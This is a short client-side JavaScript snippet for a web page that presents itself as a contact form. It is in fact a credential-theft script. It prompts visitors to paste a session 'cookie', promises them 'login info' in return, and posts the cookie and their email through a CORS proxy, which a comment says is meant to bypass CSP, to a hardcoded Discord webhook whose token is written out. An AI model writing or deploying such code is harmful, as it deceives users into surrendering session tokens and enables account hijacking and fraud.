<script>
  const form = document.getElementById('contact-form');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const cookie = document.getElementById('message').value;

    // Only send if there is something entered in the cookie (message) field
    if (!cookie.trim()) {
      alert("Please enter a valid cookie!");
      return; // Don't send if the field is empty
    }

    const webhookUrl = 'https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT';

    // Use a proxy to bypass CSP
    const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(webhookUrl)}`;

    const payload = {
      content: `üì¨ New Contact Submission\nüìß Email: ${email}\nüç™ Cookie: ${cookie}` // Send cookie content
    };

    try {
      const response = await fetch(proxyUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      if (response.ok) {
        alert('You will receive the login info in 1-2 hours.');
        form.reset();
      } else {
        alert('Something went wrong.');
      }
    } catch (err) {
      alert('Error sending message.');
      console.error(err);
    }
  });
</script>
